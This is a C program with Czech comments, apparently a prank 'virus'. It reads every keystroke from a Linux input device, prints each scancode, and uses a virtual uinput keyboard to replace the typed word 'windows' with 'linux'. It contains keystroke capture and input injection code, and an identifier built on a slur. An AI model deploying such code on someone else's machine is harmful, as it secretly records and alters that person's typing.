#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <linux/uinput.h>
#include <unistd.h>
#include <linux/input.h>

void univerzal(int uinput_soubor, int typ, int kod, int hodnota) {
    struct input_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = typ;
    ev.code = kod;
    ev.value = hodnota;
    write(uinput_soubor, &ev, sizeof(ev));
}


void poslaniKlavesy(int uinput_soubor, int kod_klavesy) {
    univerzal(uinput_soubor, EV_KEY, kod_klavesy, 1);
    univerzal(uinput_soubor, EV_SYN, SYN_REPORT, 0);
    univerzal(uinput_soubor, EV_KEY, kod_klavesy, 0);
    univerzal(uinput_soubor, EV_SYN, SYN_REPORT, 0);
}


void prepsani(int soubor) {
    for (int i = 0; i < 7; ++i) {
        poslaniKlavesy(soubor, KEY_BACKSPACE);
        usleep(10000);
    }
    poslaniKlavesy(soubor, KEY_L);
    poslaniKlavesy(soubor, KEY_I);
    poslaniKlavesy(soubor, KEY_N);
    poslaniKlavesy(soubor, KEY_U);
    poslaniKlavesy(soubor, KEY_X);
}

void setrizeni_a_zapsani(int listCharacteru[7], int pismeno, int soubor) {
    for (int i = 6; i > 0; i--) {
        listCharacteru[i] = listCharacteru[i - 1];
    }
    listCharacteru[0] = pismeno;
    // toto kontroluje zda bylo napsano windows
    if (listCharacteru[6] == 17 && listCharacteru[5] == 23 && listCharacteru[4] == 49 && listCharacteru[3] == 32 &&
        listCharacteru[2] == 24 && listCharacteru[1] == 17 && listCharacteru[0] == 31) {

        //prepis to
        prepsani(soubor);
        memset(listCharacteru, 0, 7 * sizeof(int));
    }
}

int main() {
    int listCharacteru[7];
    int soubor = open("/dev/uinput", O_WRONLY);

    const char *dev = "/dev/input/event4";
    int file_popisovac = open(dev, O_RDONLY);
    if (file_popisovac == -1) {
        // kontrola zda se dostal ke klavesnici
        perror("chyba z filepopisovacem idk proste vratil -1, asi se nedostal do souboru z klavesnici \n");
        return 1;
    }

    ioctl(soubor, UI_SET_EVBIT, EV_KEY);

    ioctl(soubor, UI_SET_KEYBIT, KEY_BACKSPACE);
    ioctl(soubor, UI_SET_KEYBIT, KEY_L);
    ioctl(soubor, UI_SET_KEYBIT, KEY_I);
    ioctl(soubor, UI_SET_KEYBIT, KEY_N);
    ioctl(soubor, UI_SET_KEYBIT, KEY_U);
    ioctl(soubor, UI_SET_KEYBIT, KEY_X);

    struct uinput_setup usetup;
    memset(&usetup, 0, sizeof(usetup));
    usetup.id.bustype = BUS_USB;
    usetup.id.vendor = 0x1234;
    usetup.id.product = 0x5678;
    strcpy(usetup.name, "GrussVirusKlavesnice");
    ioctl(soubor, UI_DEV_SETUP, &usetup);
    ioctl(soubor, UI_DEV_CREATE);
    sleep(1);


    struct input_event event;
    while (1) {
        ssize_t retardovanyDatovyTyp = read(file_popisovac, &event, sizeof(event));
        if (retardovanyDatovyTyp == sizeof(event)) {
            if (event.type == EV_KEY && event.value == 1) {
                printf("Stisknut hardwarový kód klávesy (scancode): %d\n", event.code);
                fflush(stdout);
                setrizeni_a_zapsani(listCharacteru, event.code, soubor);
            }
        }
    }
    ioctl(soubor, UI_DEV_DESTROY);
    close(soubor);
    close(file_popisovac);
    return 0;
}
